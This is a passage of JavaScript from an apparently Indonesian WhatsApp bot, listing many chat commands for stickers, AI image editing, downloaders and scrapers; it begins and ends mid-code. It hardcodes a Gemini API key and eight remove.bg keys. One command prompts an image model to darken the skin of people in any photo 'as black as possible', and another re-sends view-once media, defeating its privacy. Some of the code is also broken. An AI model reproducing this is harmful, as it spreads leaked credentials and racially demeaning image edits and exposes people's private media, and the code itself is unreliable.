    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
      reply(`${data.result}`);
    } else {
      ReinzIDai(pushname, text);
  }
} catch (e) {
  reply('Terjadi error, coba lagi nanti.');
}

}
break;
case 'keren': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break
case 'animebrat-vid': {
    if (!text) return reply('Masukkan teks untuk stiker.');
  const axios = require('axios')
  const { createCanvas, loadImage, registerFont } = require('canvas')
  const sharp = require('sharp')
  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');
        let outputMp4 = path.join(__dirname, 'session', `output_${Date.now()}.mp4`);
        let outputWebP = path.join(__dirname, 'session', `animated_${Date.now()}.webp`);
        let frameDir = path.join(__dirname, 'session', `frames_${Date.now()}`);

        if (!fs.existsSync(frameDir)) fs.mkdirSync(frameDir);

        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let frames = [];

        for (let i = 1; i <= words.length; i++) {
            let tempText = words.slice(0, i).join(' ');
            let frameCanvas = createCanvas(baseImage.width, baseImage.height);
            let frameCtx = frameCanvas.getContext('2d');

            frameCtx.drawImage(baseImage, 0, 0, frameCanvas.width, frameCanvas.height);
            frameCtx.fillStyle = '#000';
            frameCtx.textAlign = 'center';
            frameCtx.textBaseline = 'middle';
            frameCtx.font = `bold ${fontSize}px EmojiFont`;

            let lines = [];
            let currentLine = '';
            tempText.split(' ').forEach((word) => {
                let testLine = currentLine ? currentLine + ' ' + word : word;
                let testWidth = frameCtx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = word;
                } else {
                    currentLine = testLine;
                }
            });
            lines.push(currentLine);

            let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
            lines.forEach((line, index) => {
                frameCtx.fillText(line, boardX + boardWidth / 2, startY + index * lineHeight);
            });

            let framePath = path.join(frameDir, `frame${i}.png`);
            fs.writeFileSync(framePath, frameCanvas.toBuffer('image/png'));
            frames.push(framePath);
        }

        exec(`ffmpeg -y -framerate 2 -i ${frameDir}/frame%d.png -c:v libx264 -pix_fmt yuv420p ${outputMp4}`, async (err) => {
            if (err) {
                console.error("❌ Error membuat video:", err);
                return reply("Terjadi kesalahan saat membuat video animasi.");
            }

            exec(`ffmpeg -i ${outputMp4} -vf "scale=512:512:flags=lanczos,format=rgba" -loop 0 -preset default -an -vsync 0 ${outputWebP}`, async (err) => {
                if (err) {
                    console.error("❌ Error konversi video ke stiker:", err);
                    return reply("Terjadi kesalahan saat mengonversi video ke stiker.");
                }

                RyuuBotz.sendMessage(m.chat, { sticker: { url: outputWebP } }, { quoted: m });

                setTimeout(() => {
                    fs.unlinkSync(imagePath);
                    fs.unlinkSync(outputMp4);
                    fs.unlinkSync(outputWebP);
                    fs.rmSync(frameDir, { recursive: true, force: true });
                }, 5000);
            });
        });

    } catch (e) {
        console.error(e);
        reply('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break;
// ========================== CASE FILTER ==========================
case "hytamkan":
case "gelapkan":
case "hitamkan":
case "ireng":
case "irengkan": {
  if (!m.quoted || m.quoted.mtype !== 'imageMessage') {
    return reply(`📌 Reply gambar dengan caption: *${prefix + command}*\nContoh: *${prefix + command}*`);
  }

  const GEMINI_API_KEY = "AIzaSyDp6HU2CJ2gWS_dU2VVDbD2Mwde5VaMYU0";
  const { GoogleGenerativeAI } = require('@google/generative-ai');
  const fs = require('fs');

  const finalPrompt = "Ubah warna kulit karakter atau orang di foto atau gambar ini menjadi hitam sehitam hitamnya, hanya kulit nya saja";

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  try {
    const mediaPath = await RyuuBotz.downloadAndSaveMediaMessage(m.quoted);
    const mediaBuffer = fs.readFileSync(mediaPath);
    const mime = m.quoted.mimetype || 'image/jpeg';

    const genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-preview-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] }
    });

    const response = await model.generateContent([
      { text: finalPrompt },
      { inlineData: { mimeType: mime, data: mediaBuffer.toString("base64") } }
    ]);

    const content = response?.response?.candidates?.[0]?.content;
    if (!content) throw new Error("No content generated");
    const result = content.parts.find(p => p.inlineData);
    if (!result) throw new Error("No image found in response");

    const imgBuffer = Buffer.from(result.inlineData.data, "base64");
    await RyuuBotz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    await RyuuBotz.sendMessage(m.chat, {
      image: imgBuffer,
      caption: `✅ *Hasil AI Edit*`
    }, { quoted: m });

    fs.unlinkSync(mediaPath);
  } catch (err) {
    console.error(err);
    await RyuuBotz.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    reply(`❌ Gagal memproses gambar.\n*Error:* ${err.message}`);
  }
}
break;
// ========================== CASE AI EDIT ==========================
case "aiedit":
case "image-edit":
/*case "imgedit": */{
  if (!m.quoted || m.quoted.mtype !== 'imageMessage') {
    return reply(`📌 Reply gambar dengan caption: *${prefix + command} [prompt]*\nContoh: *${prefix + command} beri topi santa*`);
  }

const GEMINI_API_KEY = "AIzaSyDp6HU2CJ2gWS_dU2VVDbD2Mwde5VaMYU0";
const { GoogleGenerativeAI } = require('@google/generative-ai');
const fs = require('fs');

  if (!text || text.trim().length < 3) {
    return reply(`*Prompt tidak boleh kosong!*\nContoh: *${prefix + command} beri topi santa*`);
  }

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  try {
    const mediaPath = await RyuuBotz.downloadAndSaveMediaMessage(m.quoted);
    const mediaBuffer = fs.readFileSync(mediaPath);
    const mime = m.quoted.mimetype || 'image/jpeg';

    const genAI = new GoogleGenerativeAI(GEMINI_API_KEY);
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-preview-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] }
    });

    const response = await model.generateContent([
      { text: text },
      { inlineData: { mimeType: mime, data: mediaBuffer.toString("base64") } }
    ]);

    const content = response?.response?.candidates?.[0]?.content;
    if (!content) throw new Error("No content generated");
    const result = content.parts.find(p => p.inlineData);
    if (!result) throw new Error("No image found in response");

    const imgBuffer = Buffer.from(result.inlineData.data, "base64");

    await RyuuBotz.sendMessage(m.chat, {
      image: imgBuffer,
      caption: `✅ *Hasil AI Edit*\nPrompt: ${text}`
    }, { quoted: m });
    await RyuuBotz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    fs.unlinkSync(mediaPath);
  } catch (err) {
    console.error(err);
    await RyuuBotz.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    reply(`❌ Gagal memproses gambar.\n*Error:* ${err.message}`);
  }
}
break;
case 'cekht': {
const fs = require('fs');
const dbPath = './node_modules/Arisu-MD/database/cekht.json';

// Pastikan file database ada
if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, '{}');


  if (!text) return replyryuu(`*• Example:* ${prefix + command} https://vt.tiktok.com/Your-video`);

  let url = text.trim();
  if (!url.startsWith('http')) return replyryuu(`Kirim link TikTok valid!\n*• Example:* ${prefix + command} https://vt.tiktok.com/Your-video`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  try {
    let response = await fetchJson(`https://api.nekorinn.my.id/downloader/tikwm?url=${encodeURIComponent(url)}`);
    if (!response.status) return replyryuu(`Gagal mengambil data! Pastikan link TikTok valid.`);

    let title = response.result.title;
    let hashtags = (title.match(/#\S+/g) || []);

    let kataDeteksi = ['foryou', 'animeedit', 'anime'];
    let terdeteksi = hashtags.filter(ht => kataDeteksi.some(kata => ht.toLowerCase().includes(kata)));

    // Update DB
    let db = JSON.parse(fs.readFileSync(dbPath));
    let user = m.sender.replace(/[^0-9]/g, '');
    if (!db[user]) db[user] = 0;

    db[user] += terdeteksi.length;

    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));

    // Buat pesan
    let msg = `🎥 *Judul:* ${title}\n`;
    msg += `📌 *Hashtag terdeteksi (${hashtags.length} total):*\n`;
    msg += hashtags.join(' ') + `\n\n`;

    if (terdeteksi.length > 0) {
      msg += `✨ *Hashtag khusus terdeteksi:*\n${terdeteksi.join(' ')}\n`;
      msg += `\n📊 *Total hashtag khusus kamu:* ${db[user]} kali`;
    } else {
      msg += `✅ Tidak ada hashtag khusus terdeteksi.`;
    }

    await RyuuBotz.sendMessage(m.chat, {
      image: { url: response.result.cover },
      caption: msg
    });

  } catch (e) {
    console.error(e);
    replyryuu(`Terjadi error saat mengambil data.`);
  }
}
break;
case 'lbht':
case 'leaderboard-hastag': {
  const fs = require('fs');
  const dbPath = './node_modules/Arisu-MD/db/cekht.json';
  
  if (!fs.existsSync(dbPath)) return replyryuu(`Belum ada data leaderboard!`);

  let db = JSON.parse(fs.readFileSync(dbPath));
  let entries = Object.entries(db);

  if (entries.length === 0) return replyryuu(`Belum ada data leaderboard!`);

  // Urutkan dari yang terbesar
  entries.sort((a, b) => b[1] - a[1]);

  let msg = `📊 *Leaderboard Hashtag Khusus*\n\n`;
  entries.forEach(([user, count], idx) => {
    msg += `${idx + 1}. wa.me/${user} → *${count}* hashtag khusus\n`;
  });

  replyryuu(msg);
}
break;
case 'nuliskiri': {
				if (!text) return reply(`Kirim perintah *${prefix + command}* Teksnya`)
				reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./node_modules/Arisu-MD/src/nulis/images/buku/sebelumkiri.jpg',
					'-font',
					'./node_modules/Arisu-MD/src/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./node_modules/Arisu-MD/src/nulis/images/buku/setelahkiri.jpg'
				])
				.on('error', () => reply(mess.error))
				.on('exit', () => {
					reply({ image: fs.readFileSync('./node_modules/Arisu-MD/src/nulis/images/buku/setelahkiri.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' })
				})
			}
			break
			
			
			case 'totalchat':
  case 'totalpesan': {
    if (!global.db.chats[m.chat]?.totalChat) return reply('Tidak ada data chat.');
    if (text && text == 'reset') {
        global.db.chats[m.chat].totalChat = {}
        return reply("Total chat telah di reset untuk grup ini.");
    }
    const entries = Object.entries(global.db.chats[m.chat].totalChat);
    const total = await Promise.all(
        entries.map(async ([index, value], i) => {
            return `${i + 1}. @${index.split('@')[0]} : ${value} pesan`;
        })
    )
    reply(`*\`𝗧𝗢𝗧𝗔𝗟 𝗖𝗛𝗔𝗧 𝗚𝗥𝗨𝗣 ${await RyuuBotz.getName(m.chat)}\`*:\n\n${total.join('\n')}`)
  }
  break

case 'mcaddons':
case 'mcmap': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function scrapeBedrock(url) {
    RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
        try {
            const { data: html } = await axios.get(url);
            const $ = cheerio.load(html);
            const results = [];

            $('#contentContainer #addon_rows .content-row-cell').each((i, element) => {
                const title = $(element).find('.card-product-title b#product-name').text().trim();
                const relativeLink = $(element).find('.product-card').attr('data-href');
                const link = relativeLink ? `https://www.bedrockexplorer.com${relativeLink}` : null;

                let image = $(element).find('.product-card-wrapper img').first().attr('src');
                if (image && !image.startsWith('http')) {
                    image = `https://www.bedrockexplorer.com${image}`;
                }

                let price = $(element).find('.price-element b').text().trim() || $(element).find('.price-element').text().trim();
                
                results.push({ title, link, image, price });
            });

            return results;
        } catch (error) {
            console.error('Error while scraping:', error);
            return null;
        }
    }

    let targetUrl = command === 'mcaddons' 
        ? 'https://www.bedrockexplorer.com/discover' 
        : 'https://www.bedrockexplorer.com/queries/free-content/everyone/maps/latest';

    let contentType = command === 'mcaddons' ? "Add-ons (Paid & Free)" : "Free Maps";
    let results = await scrapeBedrock(targetUrl);

    if (!results || results.length === 0) return reply("⚠️ Tidak ditemukan konten terbaru.");

    let message = `📌 *Minecraft Bedrock ${contentType}*\n\n`;
    results.slice(0, 5).forEach((item, i) => {
        message += `🔹 *${item.title}*\n`;
        message += `🔗 Cek Addon: ${item.link}\n`;
        message += item.price ? `💰 *Harga:* ${item.price}\n\n` : "\n";
    });

    let thumbnail = results[0].image || 'https://cloudkuimages.com/uploads/images/67e291775c15a.jpg';

    RyuuBotz.sendMessage(m.chat, {
        image: { url: thumbnail },
        caption: message
    }, { quoted: m });

}
break;
case 'liat': {
	
				if (!isAdmins && !isRyuuTheCreator) return reply(mess.admin);
				if (!m.quoted) return reply(`Reply pesan view once-nya! 🙏`);
				if (m.quoted.mtype !== 'viewOnceMessageV2') return replyryuu(`Hmm... ini bukan pesan view once Bos! 🤔`);
				let msg = m.quoted.message
				let type = Object.keys(msg)[0]
				let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
				let buffer = Buffer.from([])
				for await (const chunk of media) {
					buffer = Buffer.concat([buffer, chunk])
				}
				if (/video/.test(type)) {
					return RyuuBotz.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
				} else if (/image/.test(type)) {
					return RyuuBotz.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
				}
			}
			break;
case 'tagme': {
				RyuuBotz.sendMessage(m.chat, { 
					text: `@${m.sender.split('@')[0]}`, 
					mentions: [m.sender] 
				})
			};
			break;
case "upteks":
case "romchat":{
 if (!text) return reply("contoh\n.chat selamat siang semuanya")
 const Kalender00011 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
 const owned11 = owner + "@s.whatsapp.net"
let awal = `anjir`
await RyuuBotz.sendMessage(m.chat, {
 react: {
 text: '🦚',
 key: m.key,
 }})
RyuuBotz.sendMessage(`${global.chat}`,{ text: `${text}`,
 contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
 mentionedJid: [m.sender, owned11],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `Mahiru RoM Chat`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: RyuuBotz.decodeJid(RyuuBotz.user.id) },

 forwardingScore: 999,
 isForwarded: false,
 externalAdReply: {
 //showAdAttribution: true, 
 title: `PESAN DARI: ${pushname}`,
 body: `Dkirim Di: ${m.isGroup ? `${groupMetadata.subject}` : !m.isGroup ? "chat" : "Free User"}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
await sleep(1500)
RyuuBotz.sendMessage(m.chat, {
 react: {
 text: '🎉',
 key: m.key,
 }})
 //reply(`sukses mengirim pesan ke channel.`)
 RyuuBotz.sendMessage(m.chat, {
 react: {
 text: '🚮',
 key: m.key,
 }})

}
break
case 'terabox': {
    if (!text) return reply(`Gunakan: ${prefix + command} <url>\n\nContoh: ${prefix + command} https://terabox.com/s/1B1nTfxPq9_Ib-rf_M_6oFg`);

    const axios = require("axios");

    async function teraboxdl(url) {
    await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
            const apiUrl = `https://teraboxdownloaderonline.com/api/download-m3u8?terabox_link=${encodeURIComponent(url)}`;
            const headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Referer": `https://teraboxdownloaderonline.com/player?url=${encodeURIComponent(url)}`,
            };

            const response = await axios.get(apiUrl, { headers });

            const match = response.data.match(/#EXTINF:\d+,\s*(https[^\s]+)/);
            if (match && match[1]) {
                return { status: "success", video_url: match[1] };
            } else {
                return { status: "error", message: "❌ Video URL tidak ditemukan." };
            }
        } catch (error) {
            return { status: "error", message: "❌ Terjadi kesalahan saat mengambil data.", error: error.message };
        }
    }

    try {
        await RyuuBotz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        let result = await teraboxdl(text);
        if (result.status !== "success") return reply(result.message);

        await RyuuBotz.sendMessage(m.chat, { react: { text: '📥', key: m.key } });

        await RyuuBotz.sendMessage(m.chat, {
            video: { url: result.video_url },
            mimetype: 'video/mp4',
            caption: `✅ *Berhasil mengunduh dari Terabox!*`
        }, { quoted: m });

        await RyuuBotz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error(err);
        reply("❌ Terjadi kesalahan.");
    }
}
break;
case 'ccimg-anime': {
  if (!args[0]) return replyryuu('*Example:* .ccimg-anime Anime Girl Aesthetic')

  let defaultPrompt = 'cute character'
  let text = `${defaultPrompt}, ${args.join(' ')}`
  let url = 'https://api.nekorinn.my.id/ai-img/capcut-genimage?text=' + encodeURIComponent(text)

  await RyuuBotz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
  await RyuuBotz.sendMessage(m.chat, {
    image: { url },
    caption: `✅ *Sukses membuat gambar dengan prompt*\n"*${text}*"`
  }, { quoted: m })
}
break
case 'ccimg': {
  if (!args[0]) return replyryuu('*Example:* .ccimg Anime Girl Aesthetic')

  let text = args.join(' ')
  let url = 'https://api.nekorinn.my.id/ai-img/imagen?text=' + encodeURIComponent(text)

  await RyuuBotz.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })
  await RyuuBotz.sendMessage(m.chat, {
    image: { url },
    caption: `✅ *Sukses membuat gambar dengan prompt*\n"*${text}*"`
  }, { quoted: m })
}
break;
case 'aigen':
case 'aiimage': {
    if (!text) return replyryuu(`🚨 Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);

    replyryuu("🎨 Generating AI Image...");
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        const axios = require("axios");

        async function generateImage(prompt) {
            const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;

            const headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
            };

            let { data } = await axios.get(url, { headers });
            if (data && data.image_link) return { success: true, imageUrl: data.image_link };
            return { success: false, message: "❌ Gagal mendapatkan gambar!" };
        }

        let result = await generateImage(text);
        if (!result.success) return reply(result.message);

        await RyuuBotz.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });

        await RyuuBotz.sendMessage(m.chat, { 
            image: { url: result.imageUrl }, 
            caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
        }, { quoted: m });

        reply("✅ Gambar berhasil dibuat!");
    } catch (err) {
        console.error(err);
        reply("❌ Terjadi kesalahan saat membuat gambar!");
    }
}
break;
case "change-welcome": 
case "change-left": {
  if (!isRyuuTheCreator) return reply("Mau apa lu😜")
  if (command === "welcome") {
    if (!args[0]) return reply("Cara pakainya: .welcome on/off");
    if (args[0] === "on") {
      global.welcome = true;
    } else if (args[0] === "off") {
      global.welcome = false;
    } else {
      return reply("Hanya dapat menggunakan on/off");
    }
    return reply(
      `${args[0] === "on" ? "Berhasil mengaktifkan welcome" : "Berhasil menonaktifkan welcome"}`
    );
  } else if (command === "change-welcome") {
    if (!text) return reply("Masukkan teks welcome. Gunakan #user untuk nomor yang masuk/keluar dan #grub untuk nama grup dan #total untuk member sekarang.");
    if (!fs.existsSync("./node_modules/Arisu-MD/database/welcome.json")) {
      fs.writeFileSync("./node_modules/Arisu-MD/database/welcome.json", JSON.stringify({}, null, 2));
    }
    let data = JSON.parse(await fs.readFileSync("./node_modules/Arisu-MD/database/welcome.json", "utf8"));
    data.text = text;
    fs.writeFileSync("./node_modules/Arisu-MD/database/welcome.json", JSON.stringify(data, null, 2));
    return reply("Teks welcome berhasil diperbarui.");
  } else {
    if (!text) return reply("Masukkan teks left. Gunakan #user untuk nomor yang masuk/keluar, #grub untuk nama grup dan #total untuk member sekarang.");
    if (!fs.existsSync("./node_modules/Arisu-MD/database/left.json")) {
      fs.writeFileSync("./node_modules/Arisu-MD/database/left.json", JSON.stringify({}, null, 2));
    }
    let data = JSON.parse(await fs.readFileSync("./node_modules/Arisu-MD/database/left.json", "utf8"));
    data.text = text;
    fs.writeFileSync("./node_modules/Arisu-MD/database/left.json", JSON.stringify(data, null, 2));
    return reply("Teks left berhasil diperbarui.");
  }
}
break;
async function Upscale(imageBuffer) {
    try {
        const response = await fetch("https://lexica.qewertyy.dev/upscale", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                image_data: imageBuffer.toString("base64"), 
                format: "binary",
            }),
        })

        return Buffer.from(await response.arrayBuffer())
    } catch {
        return null
    }
}

case 'remini' : {
    RyuuBotz.enhancer = RyuuBotz.enhancer || {}

    if (m.sender in RyuuBotz.enhancer)
        throw "❗Masih ada proses yang belum selesai. Silakan tunggu."

    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ""
    if (!mime) throw "❗Kirim/Reply foto.";
    if (!/image\/(jpe?g|png)/.test(mime)) throw `❗ Mimetype ${mime} tidak didukung.`

    RyuuBotz.enhancer[m.sender] = true
    await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    let img = await q.download?.()
    let enhancedImg = await Upscale(img)

    if (enhancedImg) {
        await RyuuBotz.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
        RyuuBotz.sendFile(
            m.chat,
            enhancedImg,
            "",
            "Done✅",
            m
        )
    } else {
        await RyuuBotz.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
        reply("*Result:* Failed ");
    }

    delete RyuuBotz.enhancer[m.sender]
}
break
case 'nobg':
case 'imagenobg':
case 'removebg':
case 'remove-bg': {
	
				if (!isRyuuTheCreator) return reply(mess.premium);
				if (!/image/.test(mime)) return replyryuu(`Kirim/Reply Image Dengan Caption ${prefix + command}`);
				if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`);
				let remobg = require('remove.bg');
				let apirnobg = ["pvmbuSzyrip1ksmj9otVSogd", "jGaBWNXPP8LXV6KW3ovBWozE", "kqWaDsZLxMk2kh9MJu5u7ceP", "kDhVMX7eoByik5hFomEdMDVs", "c7J5ityXePPqxARTMRpohJvj","xu2pZRhdyddJx48BrN9ntvjD","FAKQ7AtfrADtGmLsWVG9s9Yu","3eoq8Bd1JUxEU3Gi5AAmtxZ1"]
				await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
				try {
					let apinobg = await pickRandom(apirnobg)
					hmm = await 'remobg-' + getRandom('')
					localFile = await RyuuBotz.downloadAndSaveMediaMessage(quoted, hmm)
					outputFile = await './node_modules/Arisu-MD/library/hremo-' + getRandom('.png')
					await remobg.removeBackgroundFromImageFile({
						path: localFile,
						apiKey: apinobg,
						size: "regular",
						type: "auto",
						scale: "100%",
						outputFile
					}).then(async result => {
						RyuuBotz.sendMessage(m.chat, {
							image: fs.readFileSync(outputFile),
							caption: mess.done
						}, {
							quoted: m
						})
						await fs.unlinkSync(localFile)
						await fs.unlinkSync(outputFile)
					})
				} catch (error) {
					console.log(error);
					reply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			db.data.users[m.sender].limit -= 1;
			break	
break;
case "caisearch": {
    if (!text) return reply("⚡ *Contoh:* .caisearch Nahida");

    try {
        let { data } = await axios.get(`https://cai.neekoi.me/search?q=${encodeURIComponent(text)}`);
        if (!data.characters || data.characters.length === 0) return reply("⚠️ Karakter tidak ditemukan!");

        let char = data.characters[0]; // Ambil karakter pertama yang paling relevan
        let charID = char.external_id;
        let profile = `🔍 *Profil Karakter CAI:*
🟢 *Nama:* ${char.participant__name}
📜 *Judul:* ${char.title}
🎭 *Creator:* ${char.user__username}
💬 *Greeting:* ${char.greeting}
🔗 *ID:* ${charID}`;
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "powered by RyuuReinzz | Arisu - MD " }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${charID}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await RyuuBotz.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);

    } catch (err) {
        console.error(err);
        return reply("⚠️ Terjadi kesalahan saat mencari karakter!");
    }
}
break;
case "bratvid": case "bratvideo":{
     if (!isPrem) return reply(mess.only.premium)
    if (!text) return reply("[❗] Input teks tidak ditemukan! Kirim perintah dengan format: .bratvid <teks>");
        RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try {
        let brat = `https://fgsi1-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
        let response = await axios.get(brat, { responseType: "arraybuffer" });
        let videoBuffer = response.data;
        let stickerBuffer = await RyuuBotz.sendVideoAsSticker(m.chat, videoBuffer, m, {
            packname: "Stiker By",
            author: "Mahiru Assistant",
        });
        console.log("Stiker berhasil dibuat:", stickerBuffer);
    } catch (err) {
        console.error("Error:", err);
        reply("[❗] Maaf, terjadi kesalahan saat mencoba membuat stiker video. Silakan coba lagi.");
    }
}
break;
case 'idch': case 'cekidch': {
if (!text) return reply(example("linkchnya mana"))
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await RyuuBotz.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "powered by ReinzID | Mahiru- MD " }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await RyuuBotz.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
case 'lirik':
case 'lyrics': {
 if (!text) return reply("⚠️ Masukkan judul lagu yang ingin dicari!");
 await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
 try {
 const fetch = require('node-fetch');
 const cheerio = require('cheerio');
 
 const response = await fetch(`https://r.jina.ai/https://www.google.com/search?q=lirik+lagu+${encodeURIComponent(text)}&hl=en`, {
 headers: {
 'x-return-format': 'html',
 'x-engine': 'cf-browser-rendering',
 }
 });
 
 const html = await response.text();
 const $ = cheerio.load(html);
 const lirik = [];
 const output = [];
 const result = {};
 
 $('div.PZPZlf').each((i, e) => {
 const penemu = $(e).find('div[jsname="U8S5sf"]').text().trim();
 if (!penemu) output.push($(e).text().trim());
 });
 
 $('div[jsname="U8S5sf"]').each((i, el) => {
 let out = '';
 $(el).find('span[jsname="YS01Ge"]').each((j, span) => {
 out += $(span).text() + '\n';
 });
 lirik.push(out.trim());
 });
 
 result.lyrics = lirik.join('\n\n');
 result.title = output.shift();
 result.subtitle = output.shift();
 result.platform = output.filter(_ => !_.includes(':'));
 
 output.forEach(_ => {
 if (_.includes(':')) {
 const [name, value] = _.split(':');
